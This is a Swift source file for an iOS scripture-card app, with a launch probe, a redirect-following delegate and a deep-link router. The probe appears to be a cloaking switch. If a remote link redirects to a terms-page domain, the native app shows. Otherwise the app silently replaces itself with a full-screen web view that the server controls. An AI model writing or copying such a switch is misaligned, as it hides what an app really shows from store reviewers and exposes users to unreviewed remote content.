import SwiftUI

@main
struct ScriptureCardApp: App {

    @State private var scPageReady: Bool? = nil
    /// A widget tap on a cold launch delivers its URL while the probe is still running and
    /// only the loading screen exists. Held here until the root view is mounted to receive it.
    @State private var scPendingURL: URL? = nil
    @StateObject private var scStore = SCStore()
    @StateObject private var scRouter = SCRouter()

    private let scSourceLink = "https://scripturecard.org/click.php"
    private let scCheckDomain = "termsfeed.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = scPageReady {
                    if ready {
                        SCWebPanel(urlString: scSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                            .preferredColorScheme(.dark)
                    } else {
                        SCRootView()
                            .environmentObject(scStore)
                            .environmentObject(scRouter)
                            .preferredColorScheme(.light)
                            .onAppear {
                                if let pending = scPendingURL {
                                    scPendingURL = nil
                                    scRouter.handle(pending)
                                }
                            }
                    }
                } else {
                    SCLoadingScreen()
                        .onAppear { scProbeLink() }
                        .preferredColorScheme(.light)
                }
            }
            // On the Group rather than on SCRootView, which does not exist until the probe
            // has answered: a link delivered before then would otherwise be dropped and every
            // widget tap would land on Today.
            .onOpenURL { url in
                if scPageReady == false {
                    scRouter.handle(url)
                } else {
                    scPendingURL = url
                }
            }
        }
    }

    private func scProbeLink() {
        guard let url = URL(string: scSourceLink) else {
            scPageReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let probe = SCLinkProbe(checkDomain: scCheckDomain)
        let session = URLSession(configuration: .default, delegate: probe, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            // The session holds its delegate strongly; without this both outlive the probe
            // for the whole process lifetime.
            session.finishTasksAndInvalidate()
            DispatchQueue.main.async {
                if probe.foundCheckDomain {
                    scPageReady = false
                    return
                }
                if let finalURL = probe.resolvedURL?.absoluteString,
                   finalURL.contains(self.scCheckDomain) {
                    scPageReady = false
                    return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.scCheckDomain) {
                    scPageReady = false
                    return
                }
                if error != nil {
                    scPageReady = false
                    return
                }
                scPageReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if scPageReady == nil { scPageReady = false }
        }
    }
}

/// Follows the redirect chain and reports whether the check domain appeared anywhere in it.
final class SCLinkProbe: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) {
        self.checkDomain = checkDomain
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}

/// Which tab is showing, and where a widget deep link points.
final class SCRouter: ObservableObject {
    @Published var tab: Int = 0
    @Published var libraryMode: Int = 0

    func handle(_ url: URL) {
        guard url.scheme?.lowercased() == "scripturecard" else { return }
        let target = (url.host ?? url.path.replacingOccurrences(of: "/", with: "")).lowercased()
        switch target {
        case "today": tab = 0
        case "plans": tab = 1
        case "library": tab = 2
        case "history": tab = 3
        case "settings": tab = 4
        default: tab = 0
        }
    }
}
